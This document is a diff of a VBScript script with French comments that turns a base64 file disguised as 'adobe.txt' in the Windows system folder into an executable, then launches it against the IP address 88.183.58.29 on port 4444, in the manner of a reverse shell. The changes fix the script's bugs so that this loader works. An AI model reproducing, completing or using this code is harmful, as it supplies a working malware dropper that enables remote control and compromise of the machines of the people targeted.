@@ -4,15 +4,12 @@ Option Explicit
 
 Dim a, inFile, fso, ts, b64, bytes, outFile, curDir
 
-Set a = "c:\windows\system32\adobe.txt"
+a = "c:\windows\system32\adobe.txt"
 
 ' --- Vérifie les paramètres ---
-If a.Count < 1 Then
-  WScript.Echo "Usage: cscript //nologo " & WScript.ScriptName & " <base64File>"
-  WScript.Quit 1
-End If
 
-inFile = a(0)
+
+inFile = a
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 
@@ -49,7 +46,8 @@ WriteBytes outFile, bytes
 Dim sh
 Set sh = CreateObject("WScript.Shell")
 
-sh.Run """outFile"" 88.183.58.29 4444", 1, False
+sh.Run """" & outFile & """ 88.183.58.29 4444", 1, False
+
 loop
 
 
@@ -91,6 +89,7 @@ Private Function RandomName(ByVal n)
     RandomName = RandomName & Mid(chars, Int(Rnd * Len(chars)) + 1, 1)
   Next
 End Function
+
 
 
 
